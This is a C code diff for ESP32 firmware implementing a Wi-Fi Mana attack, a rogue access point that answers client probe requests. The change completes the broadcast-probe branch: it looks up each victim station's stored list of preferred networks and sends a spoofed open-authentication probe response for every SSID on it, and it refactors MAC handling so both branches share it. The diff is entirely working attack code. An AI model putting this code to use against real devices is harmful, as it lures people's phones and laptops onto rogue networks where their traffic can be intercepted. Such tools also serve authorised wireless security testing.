@@ -716,25 +716,40 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
                Get current MAC - NOTE: MAC hopping during the Mana attack will render the attack useless
                                        Make sure you're not running a process that uses MAC randomisation at the same time
             */
+            /* Prepare parameters that are needed to respond to both broadcast and directed probe requests */
+            uint8_t bCurrentMac[6];
+            char strCurrentMac[18];
+            esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bCurrentMac);
+            if (err == ESP_OK) {
+                mac_bytes_to_string(bCurrentMac, strCurrentMac);
+            } else {
+                memcpy(bCurrentMac, &payload[PROBE_DESTADDR_OFFSET], 6);
+                mac_bytes_to_string(bCurrentMac, strCurrentMac);
+                ESP_LOGW(MANA_TAG, "Failed to get MAC from device, falling back to the frame's BSSID: %s\n", strCurrentMac);
+            }
+            /* Copy destMac into a 6-byte array */
+            uint8_t bDestMac[6];
+            memcpy(bDestMac, &payload[PROBE_SRCADDR_OFFSET], 6);
+            char strDestMac[18];
+            err = mac_bytes_to_string(bDestMac, strDestMac);
+            if (err != ESP_OK) {
+                ESP_LOGE(MANA_TAG, "Unable to convert probe request source MAC from bytes to string: %s", esp_err_to_name(err));
+                return;
+            }
+
             if (ssid_len == 0) {
                 /* Broadcast probe request - send a probe response for every SSID in the STA's PNL */
-                // TODO - networkList[i].mac === &payload[PROBE_SRCADDR_OFSET] for 6 bytes
-                //        iterate through networkList[i].ssidCount elements of networkList[i].ssids[]
-            } else {
-                /* Send a directed probe response in reply */
-                uint8_t bCurrentMac[6];
-                char strCurrentMac[18];
-                esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bCurrentMac);
-                if (err == ESP_OK) {
-                    mac_bytes_to_string(bCurrentMac, strCurrentMac);
-                } else {
-                    memcpy(bCurrentMac, &payload[PROBE_DESTADDR_OFFSET], 6);
-                    mac_bytes_to_string(bCurrentMac, strCurrentMac);
-                    ESP_LOGW(MANA_TAG, "Failed to get MAC from device, falling back to the frame's BSSID: %s\n", strCurrentMac);
+                int i;
+                for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
+                if (i < networkCount) {
+                    /* Found the station at networkList[i] - cycle through its SSIDs */
+                    for (int j=0; j < networkList[i].ssidCount; ++j) {
+                        send_probe_response(bCurrentMac, bDestMac, networkList[i].ssids[j], AUTH_TYPE_NONE);
+                    }
                 }
-                /* Copy destMac into a 6-byte array */
-                uint8_t bDestMac[6];
-                memcpy(bDestMac, &payload[PROBE_SRCADDR_OFFSET], 6);
+
+            } else {
+                /* Directed probe request - Send a directed probe response in reply */
 
                 // TODO : Config option to set auth type. For now just do open auth
 
@@ -742,12 +757,6 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
                    list if it's not already there 
                 */
                 int i;
-                char strDestMac[18];
-                err = mac_bytes_to_string(bDestMac, strDestMac);
-                if (err != ESP_OK) {
-                    ESP_LOGE(MANA_TAG, "Unable to convert probe request source MAC from bytes to string: %s", esp_err_to_name(err));
-                    return;
-                }
                 /* Look for STA's MAC in networkList[] */
                 for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
                 if (i < networkCount) {
